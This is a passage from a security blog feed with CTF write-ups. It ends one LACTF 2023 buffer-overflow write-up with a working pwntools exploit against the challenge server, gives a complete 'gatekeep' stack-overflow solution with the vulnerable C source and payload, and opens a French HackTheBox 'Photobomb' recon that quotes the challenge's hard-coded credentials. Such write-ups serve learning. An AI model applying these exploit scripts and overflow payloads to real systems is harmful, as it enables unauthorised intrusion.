</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040126f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">237</span><span style="color:#f92672">&gt;</span>: jne    <span style="color:#ae81ff">0x4012b6</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">308</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401271</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">239</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe56</span>]        <span style="color:#75715e"># 0x4020ce</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401278</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">246</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040127d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">251</span><span style="color:#f92672">&gt;</span>: mov    edi,<span style="color:#ae81ff">0xf</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401282</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">256</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401090</span> <span style="color:#f92672">&lt;</span>sleep<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401287</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">261</span><span style="color:#f92672">&gt;</span>: mov    eax,DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x44</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040128a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">264</span><span style="color:#f92672">&gt;</span>: test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040128c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">266</span><span style="color:#f92672">&gt;</span>: je     <span style="color:#ae81ff">0x4012a8</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">294</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040128e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">268</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe4a</span>]        <span style="color:#75715e"># 0x4020df</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401295</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">275</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040129a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">280</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe52</span>]        <span style="color:#75715e"># 0x4020f3</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012a1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">287</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401050</span> <span style="color:#f92672">&lt;</span>system<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012a6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">292</span><span style="color:#f92672">&gt;</span>: jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012a8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">294</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xd9d</span>]        <span style="color:#75715e"># 0x40204c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012af</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">301</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012b4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">306</span><span style="color:#f92672">&gt;</span>: jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012b6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">308</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe43</span>]        <span style="color:#75715e"># 0x402100</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012bd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">315</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012c2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">320</span><span style="color:#f92672">&gt;</span>: mov    edi,<span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012c7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">325</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401080</span> <span style="color:#f92672">&lt;</span>exit<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012cc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>: mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012d1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">335</span><span style="color:#f92672">&gt;</span>: leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004012d2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">336</span><span style="color:#f92672">&gt;</span>: ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>We&rsquo;ll jump at the <code>puts()</code> right before the <code>system()</code> call. (<code>0x00401295</code>)</p>
<p>Now that we know all of that, let&rsquo;s make our exploit !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bot_patched&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.31.so&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>DEBUG:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;lac.tf&#34;</span>,<span style="color:#ae81ff">31180</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    condition <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;give me the flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>len(condition))
</span></span><span style="display:flex;"><span>    rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>    rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00401295</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Added a ret gadget to fix the stack alignment because i&#39;m on Ubuntu, but it works fine without it remotely é</span>
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000401016</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> condition <span style="color:#f92672">+</span> junk <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> rip
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag -&gt; &#34;</span> <span style="color:#f92672">+</span> r<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#r.interactive()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Now, we can test it locally and remotely to check it works fine:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/220722169-62441fde-b37d-439e-bfd6-5b3d48593ab6.png" alt="2023-02-16-114129_1161x653_scrot"></p>
<p>and it does! gg!</p>
<p><em>flag -&gt; lactf{hey_stop_bullying_my_bot_thats_not_nice}</em></p>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 LACTF 2023 - pwn/gatekeep</title>
            <link>/posts/2023/02/lactf-2023-pwn/gatekeep/</link>
            <pubDate>Wed, 15 Feb 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/02/lactf-2023-pwn/gatekeep/</guid>
            <description>Note First pwn challenge of this CTF. It&amp;rsquo;s pretty easy because it only consists in overwriting a variable on the stack to make a condition valid and print the flag.
Description If I gaslight you enough, you won&amp;#39;t be able to get my flag! :) Note: The attached binary is the exact same as the one executing on the remote server. Dockerfile, gatekeep.c, gatekeep
File information checksec gatekeep &amp;amp;&amp;amp; file gatekeep [*] &amp;#39;/home/conflict/ctfs/lactf2023/gatekeep/gatekeep&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled gatekeep: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>First <code>pwn</code> challenge of this CTF. It&rsquo;s pretty easy because it only consists in overwriting a variable on the stack to make a condition valid and print the flag.</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>If I gaslight you enough, you won&#39;t be able to get my flag! :)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Note: The attached binary is the exact same as the one executing on the remote server.
</span></span></code></pre></div><p><a href="https://lactf-challs.storage.googleapis.com/uploads/7013cbe3f634d74f93f7a29bd24010d91068455ac8d9fb16f173d9f14b0bc5fe/Dockerfile"><code>Dockerfile</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/c87fb83bcc4c5a69bf031715477fa5022ff4e0fbde0f3de64b055ab9c02fe6e9/gatekeep.c"><code>gatekeep.c</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/552482ce75bc7e3ee7d6c5d951c19a52c00f9711f8c79e89e6547dacafbfa051/gatekeep"><code>gatekeep</code></a></p>
<h2 id="file-information">File information</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">gatekeep</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">gatekeep</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/lactf2023/gatekeep/gatekeep&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">PIE</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">gatekeep</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">pie</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">80c46fdc485592ada59a02cc96b63fc03e9c6434</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>So, we&rsquo;re going to work on a 64 bits non-stripped dynamically linked executable, with <code>PIE</code> and <code>NX</code> enabled, but they are irrelevant to achieve our goal.</p>
<p>For the source code, there is no need to decompile the file or to struggle with some pseudo-code because we have the <code>.c</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_flag</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">256</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    FILE<span style="color:#f92672">*</span> flagfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (flagfile <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Cannot read flag.txt.&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fgets</span>(flag, <span style="color:#ae81ff">256</span>, flagfile);
</span></span><span style="display:flex;"><span>        flag[<span style="color:#a6e22e">strcspn</span>(flag, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(flag);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">check</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">15</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> pass[<span style="color:#ae81ff">10</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> access <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// If my password is random, I can gatekeep my flag! :)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> data <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (data <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Can&#39;t access /dev/urandom.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">ssize_t</span> result <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(data, pass, <span style="color:#66d9ef">sizeof</span> pass);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (result <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Data not received from /dev/urandom</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(data);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Password:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gets</span>(input);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strcmp</span>(input, pass)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;I swore that was the right password ...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        access <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(access) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Guess I couldn&#39;t gaslight you!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">print_flag</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;If I gaslight you enough, you won&#39;t be able to guess my password! :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">check</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
<p>Here, we can see a <code>print_flag()</code> function that will read and print out our flag, so that&rsquo;s the function we want to call</p>
<p>Then we have the <code>check()</code> function, it generates a random password then calls <code>gets()</code> to ask us the password. As a reminder, <strong>this function is dangerous and should never be used</strong> because it doesn&rsquo;t allow you to check the length of the user input.</p>
<p>It then compares our input and the password, and if they match, it sets the <code>access</code> variable to <code>1</code>.</p>
<p>Finally, if <code>access</code> is not <code>null</code>, it prints the flag.</p>
<p>Since we know we can overflow the buffer thanks to <code>gets()</code>, we will be able to overwrite variables on the stack, including <code>access</code>. The goal here is going to be to change its value to anything that is not <code>null</code>.</p>
<p>To find out how many characters we will enter, we have two options, but the easiest one would be to read the source code and figure out how many bytes the previous variables take.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">15</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> pass[<span style="color:#ae81ff">10</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> access <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span></code></pre></div><p>Here we can see two variables initialised before the <code>access</code> (I know there is also a <code>flag[256]</code> buffer but it is only initialised when <code>print_flag()</code> is called). They take <code>25 bytes</code> in total so we can assume that if we enter <code>30 bytes</code> we should overwrite <code>access</code>.</p>
<p>For the exploit, there is no need to use <code>pwntools</code>, we&rsquo;re just going to connect via <code>netcat</code> and send the payload manually.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;print(&#39;A&#39;*30)&#34;</span>
</span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/220713416-8280c40e-9c8a-49b3-9d23-49bba0cfb64e.png" alt="2023-02-14-184628_717x712_scrot"></p>
<p><em>flag -&gt; lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}</em></p>
]]></content>
        </item>
        
        <item>
            <title>📗 HackTheBox - Photobomb</title>
            <link>/posts/2023/02/hackthebox-photobomb/</link>
            <pubDate>Mon, 13 Feb 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/02/hackthebox-photobomb/</guid>
            <description>Table of contents Recon
Foothold
Privilege Escalation
Note Il s&amp;rsquo;agit de la toute première room que j&amp;rsquo;ai flag sur HTB, il y a de ça 3 ou 4 mois. Elle était correcte, vous allez encore un peu pouvoir apprécier mon superbe Ubuntu riced on gnome (c&amp;rsquo;est une horreur).
Recon La page est assez sobre, avec un lien et.. c&amp;rsquo;est tout
Le lien nous envoie vers /printer, qui nous demande un username et un mot de passe</description>
            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of contents</h3>
<hr>
<ul>
<li>
<p><a href="#recon">Recon</a></p>
</li>
<li>
<p><a href="#foothold">Foothold</a></p>
</li>
<li>
<p><a href="#privilege-escalation">Privilege Escalation</a></p>
</li>
</ul>
<hr>
<h1 id="note">Note</h1>
<p>Il s&rsquo;agit de la toute première room que j&rsquo;ai flag sur HTB, il y a de ça 3 ou 4 mois. Elle était correcte, vous allez encore un peu pouvoir apprécier mon superbe Ubuntu riced on gnome (c&rsquo;est une horreur).</p>
<h1 id="recon">Recon</h1>
<p><img src="https://i.ibb.co/KGVjb2V/image.png" alt="page.png"></p>
<p>La page est assez sobre, avec un lien et.. c&rsquo;est tout</p>
<p>Le lien nous envoie vers <code>/printer</code>, qui nous demande un username et un mot de passe</p>
<p>En inspéctant le <code>js</code> de la page, on voit que si l&rsquo;utilisateur a le cookie <code>isPhotoBombTechSupport</code> et qu&rsquo;il clique dessus, il sera renvoyé vers le <code>/printer</code> avec les identifiants <code>pH0t0:b0Mb!</code></p>
<p><img src="https://i.ibb.co/94f0JG9/image.png" alt="ids.png"></p>
<p>On peut donc manuellement s&rsquo;ajouter le cookie (oui, nous pourrions aussi directement recopier les identifiants mais ça nous évitera de les retaper à l&rsquo;avenir), puis on clique sur le lien</p>
<p>Le site affiche une alerte, puis nous redirige vers le <code>/printer</code> en <strong>étant connecté</strong></p>
<p><img src="https://i.ibb.co/YTyY4jp/image.png" alt="alert.png"></p>
<p>On finis rapidement la reconnaissance par vérifier le <code>/robots.txt</code>, mais on tombe sur une <code>404</code>, avec un bout de code en ruby, rien de très utile</p>
<p><img src="https://i.ibb.co/5k4KZ7T/image.png" alt="robots.txt.png"></p>
<h1 id="foothold">Foothold</h1>
